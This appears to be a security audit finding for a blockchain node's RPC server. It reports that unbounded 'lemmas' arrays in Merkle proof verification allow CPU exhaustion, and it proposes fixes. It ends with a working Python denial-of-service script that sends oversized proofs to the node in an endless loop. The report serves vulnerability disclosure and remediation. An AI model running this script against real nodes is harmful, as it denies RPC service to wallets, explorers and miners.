### Title
Unbounded Attacker-Controlled `lemmas` Array in CBMT Proof Verification Causes Excessive CPU Consumption — (File: `rpc/src/module/chain.rs`)

---

### Summary

The `verify_transaction_proof` and `verify_transaction_and_witness_proof` RPC methods accept caller-supplied `MerkleProof` structs containing `indices` and `lemmas` arrays with no application-level size bounds. An RPC caller can craft a request with a maximally large `lemmas` array, forcing the node to perform a large number of blake2b hash computations during `CBMT::retrieve_leaves()` and `merkle_proof.root()` calls, degrading RPC availability.

---

### Finding Description

`verify_transaction_proof` in `rpc/src/module/chain.rs` accepts a `TransactionProof` whose embedded `MerkleProof` carries two caller-controlled vectors:

```
indices: Vec<Uint32>
lemmas:  Vec<H256>
``` [1](#0-0) 

The implementation constructs a `MerkleProof::new()` directly from these caller-supplied vectors without any size validation: [2](#0-1) 

It then passes the unchecked proof to `CBMT::retrieve_leaves()` and `merkle_proof.root()`: [3](#0-2) 

`CBMT` is a Complete Binary Merkle Tree backed by the `merkle_cbt` crate, using `MergeByte32` (blake2b) as the merge function: [4](#0-3) 

Both `retrieve_leaves` and `root` iterate over the proof's `lemmas`, invoking one blake2b hash per lemma. Because the `lemmas` vector is entirely attacker-controlled and unbounded, a caller can force an arbitrarily large number of hash computations per RPC call.

`verify_transaction_and_witness_proof` is doubly expensive: it constructs and processes **two** such unchecked proofs per call (one for `transactions_proof`, one for `witnesses_proof`): [5](#0-4) 

The only nominal limit is `max_request_body_size` (default 10 MiB): [6](#0-5) 

However, examining `rpc/src/server.rs`, the `config.max_request_body_size` value is **never applied** to the axum router — no body-size middleware is present in the router setup: [7](#0-6) 

Even if the 10 MiB limit were enforced, an attacker could pack approximately 130,000–150,000 lemmas (each H256 is `"0x" + 64 hex chars` ≈ 68 bytes in JSON), each requiring a full blake2b computation.

The `get_tx_indices` helper used by the *generation* path does check for empty input and duplicates, but the *verification* path has no analogous guard: [8](#0-7) 

---

### Impact Explanation

An RPC caller can repeatedly submit `verify_transaction_proof` or `verify_transaction_and_witness_proof` requests with maximally large `lemmas` arrays. Each request forces the RPC worker thread to perform tens of thousands of blake2b hash computations before returning `"Invalid transaction proof"`. Because RPC worker threads are shared across all callers, sustained crafted requests can starve legitimate RPC users, degrading or blocking node RPC availability. The node itself (consensus, P2P) is unaffected, but all RPC-dependent tooling (wallets, explorers, miners using `get_block_template`) is impacted.

---

### Likelihood Explanation

The RPC is bound to `127.0.0.1:8114` by default, restricting access to local processes. However:
- Operators commonly expose the RPC to internal networks or, despite warnings, to the public internet.
- The attack requires no authentication, no valid transaction, and no on-chain state — only a valid `block_hash` (trivially obtained from `get_tip_header`).
- The `max_request_body_size` config is not enforced in the current server implementation, removing the only nominal throttle.
- `verify_transaction_and_witness_proof` doubles the cost per call.

Likelihood is **medium** for nodes with default localhost binding, and **high** for nodes with exposed RPC.

---

### Recommendation

1. **Bound `lemmas` and `indices` before proof construction.** For a CBMT over `N` leaves, the maximum valid number of lemmas is `⌈log₂(N)⌉ × indices.len()`. Reject any proof where `lemmas.len()` exceeds this bound derived from `block.transactions().len()`.

2. **Enforce `max_request_body_size` in the axum server.** Apply a `DefaultBodyLimit` layer using the configured value:
   ```rust
   .layer(DefaultBodyLimit::max(config.max_request_body_size))
   ``` [7](#0-6) 

3. **Apply the same fix to `verify_transaction_and_witness_proof`**, which processes two unchecked proofs per call. [9](#0-8) 

---

### Proof of Concept

```python
import requests, json

# Obtain any valid block hash from the node
tip = requests.post("http://127.0.0.1:8114", json={
    "jsonrpc": "2.0", "method": "get_tip_header", "params": [], "id": 0
}).json()
block_hash = tip["result"]["hash"]

# Craft ~130,000 lemmas (fits within 10 MiB JSON body)
lemmas = ["0x" + "aa" * 32] * 130_000

payload = {
    "jsonrpc": "2.0",
    "method": "verify_transaction_proof",
    "params": [{
        "block_hash": block_hash,
        "witnesses_root": "0x" + "00" * 32,
        "proof": {
            "indices": ["0x0"],
            "lemmas": lemmas
        }
    }],
    "id": 1
}

# Each call forces ~130,000 blake2b computations before returning
# "Invalid transaction proof". Repeated calls saturate RPC workers.
import time
while True:
    t = time.time()
    requests.post("http://127.0.0.1:8114", json=payload)
    print(f"call took {time.time()-t:.2f}s")
```

The node will spend significant CPU time iterating over the 130,000 lemmas in `merkle_proof.root()` before returning an error, with no rate limiting or early exit based on the block's actual transaction count.

### Citations

**File:** util/jsonrpc-types/src/blockchain.rs (L1380-1388)
```rust
#[derive(Clone, Default, Serialize, Deserialize, PartialEq, Eq, Hash, Debug, JsonSchema)]
pub struct MerkleProof {
    /// Leaves indices in the CBMT that are proved present in the block.
    ///
    /// These are indices in the CBMT tree not the transaction indices in the block.
    pub indices: Vec<Uint32>,
    /// Hashes of all siblings along the paths to root.
    pub lemmas: Vec<H256>,
}
```

**File:** rpc/src/module/chain.rs (L1948-1961)
```rust
                let merkle_proof = MerkleProof::new(
                    tx_proof
                        .proof
                        .indices
                        .into_iter()
                        .map(|index| index.value())
                        .collect(),
                    tx_proof
                        .proof
                        .lemmas
                        .into_iter()
                        .map(|lemma| lemma.into())
                        .collect(),
                );
```

**File:** rpc/src/module/chain.rs (L1963-1977)
```rust
                CBMT::retrieve_leaves(block.tx_hashes(), &merkle_proof)
                    .and_then(|tx_hashes| {
                        merkle_proof
                            .root(&tx_hashes)
                            .and_then(|raw_transactions_root| {
                                if block.transactions_root()
                                    == merkle_root(&[raw_transactions_root, witnesses_root])
                                {
                                    Some(tx_hashes.iter().map(|hash| hash.into()).collect())
                                } else {
                                    None
                                }
                            })
                    })
                    .ok_or_else(|| RPCError::invalid_params("Invalid transaction proof"))
```

**File:** rpc/src/module/chain.rs (L2005-2043)
```rust
    fn verify_transaction_and_witness_proof(
        &self,
        tx_proof: TransactionAndWitnessProof,
    ) -> Result<Vec<H256>> {
        let snapshot = self.shared.snapshot();
        snapshot
            .get_block(&(&tx_proof.block_hash).into())
            .ok_or_else(|| {
                RPCError::invalid_params(format!("Cannot find block {:#x}", tx_proof.block_hash))
            })
            .and_then(|block| {
                let transactions_merkle_proof = MerkleProof::new(
                    tx_proof
                        .transactions_proof
                        .indices
                        .into_iter()
                        .map(|index| index.value())
                        .collect(),
                    tx_proof
                        .transactions_proof
                        .lemmas
                        .into_iter()
                        .map(|lemma| lemma.into())
                        .collect(),
                );
                let witnesses_merkle_proof = MerkleProof::new(
                    tx_proof
                        .witnesses_proof
                        .indices
                        .into_iter()
                        .map(|index| index.value())
                        .collect(),
                    tx_proof
                        .witnesses_proof
                        .lemmas
                        .into_iter()
                        .map(|lemma| lemma.into())
                        .collect(),
                );
```

**File:** rpc/src/module/chain.rs (L2281-2288)
```rust
    fn get_tx_indices(
        &self,
        tx_hashes: Vec<H256>,
        block_hash: Option<H256>,
    ) -> Result<(core::BlockView, Vec<u32>)> {
        if tx_hashes.is_empty() {
            return Err(RPCError::invalid_params("Empty transaction hashes"));
        }
```

**File:** util/types/src/utilities/merkle_tree.rs (L9-19)
```rust
impl Merge for MergeByte32 {
    type Item = Byte32;
    fn merge(left: &Self::Item, right: &Self::Item) -> Self::Item {
        let mut ret = [0u8; 32];
        let mut blake2b = new_blake2b();

        blake2b.update(left.as_slice());
        blake2b.update(right.as_slice());
        blake2b.finalize(&mut ret);
        ret.into()
    }
```

**File:** resource/ckb.toml (L186-187)
```text
# Default is 10MiB = 10 * 1024 * 1024
max_request_body_size = 10485760
```

**File:** rpc/src/server.rs (L119-129)
```rust
        let app = Router::new()
            .route("/", method_router.clone())
            .route("/{*path}", method_router)
            .route("/ping", get(ping_handler))
            .layer(Extension(Arc::clone(rpc)))
            .layer(CorsLayer::permissive())
            .layer(TimeoutLayer::with_status_code(
                StatusCode::REQUEST_TIMEOUT,
                Duration::from_secs(30),
            ))
            .layer(Extension(stream_config));
```
